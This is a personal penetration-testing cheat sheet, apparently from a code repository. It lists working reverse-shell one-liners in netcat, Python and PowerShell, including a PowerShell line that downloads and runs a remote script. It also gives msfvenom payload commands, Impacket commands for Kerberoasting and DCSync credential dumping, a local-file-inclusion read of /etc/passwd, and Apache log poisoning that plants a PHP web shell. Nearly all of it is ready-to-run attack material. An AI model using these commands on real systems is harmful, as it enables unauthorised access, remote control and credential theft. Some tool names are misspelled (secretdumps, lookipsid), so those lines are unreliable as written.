# Pen-Test Cheat Sheet
This repository contains this markdown file which includes common commands and tools used in a penetration test  
This will be a list of commands that has personally worked for me so I do not have to go back and find what and what doesn't work  
Commands will be seperated into categories  

## Reverse Shells

### Netcat Traditional
```
nc -e /bin/sh 10.10.10.10 4444
nc -e /bin/bash 10.10.10.10 4444
nc -c bash 10.10.10.10 4444
```
### Netcat OpenBSD
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```
### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
### Windows
```
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```
Use this command in conjunction with nishang shell  
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

### PHP Upload
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php  

### msfvenom commands

#### Windows
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > reverse.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```
#### Linux
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```
## Spawn TTY Shell
`rlwrap` enhances the shell, allowing you to clear the screen with `CTRL + L`
```
rlwrap nc 10.10.10.10 4444
```
## nmap
```
nmap -sC -sV -oA nmap/name_of_file 10.10.10.10
```
## Gobuster
```
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list.2.3-medium.txt -t 50
```
## Impacket

https://github.com/SecureAuthCorp/impacket

### psexec
Used to remotely login to victim's computer
```
psexec.py domain/user:password@10.10.10.10
```
### GetUserSPNs
Script to find and fetch Service Principle Names assosicated with normal user accounts   
Hash retrieved can be cracked using John or Hashcat  
```
GetUserSPNs.py domain/user:password -dc-ip 10.10.10.10 -request
```
### secretdumps

Performs a DCSync Attack  
DCSync Attacks pretends to be a domain controller  
Targetted account must have DCSync Privileges which can be obtain if user has Exchange Windows Permission  

```
secretdumps.py domain/user:password@10.10.10.10
```

### smbclient

A generic SMB client
```
smbclient.py domain/user:password@10.10.10.10
```

### lookupsid

Tool to bruteforce Windows SIDs which will attempt to identify remote users and groups 

```
lookipsid.py domain/user:password@10.10.10.10
```
## Port Forwarding

### ssh 

```
    ssh -L port_to_host:ip_address:port_to_forward user@host.com
```
## Local File Inclusion (LFI) / Directory Traversal

### Extension Bypass using Null byte

PHP versions before 5.5 are vulnerable to null byte injection, meaning that adding a null byte at the end of the filename should bypass the extension check.  
It can bypass codes that append `.php` to the file requested

Example:

`include($_GET['language'] . ".php");`

`language=/etc/passwd%00` will result in `language=/etc/passwd`


### RCE Through Apache / Nginx Log Files

Nginx log files are readable by www-data user by default  
Apache log files are readable by root and adm users (older versions are readable by all users)  

#### Poisoning User-Agent

*Example*  

Once LFI exists in the target system, send a request to  

`http://example.com/index.php?language=/var/log/apache2/access.log`

Change the User-Agent to `<?php system($_GET['cmd']); ?>`

Inject commands via `http://example.com/index.php?language=/var/log/apache2/access.log&cmd=id`

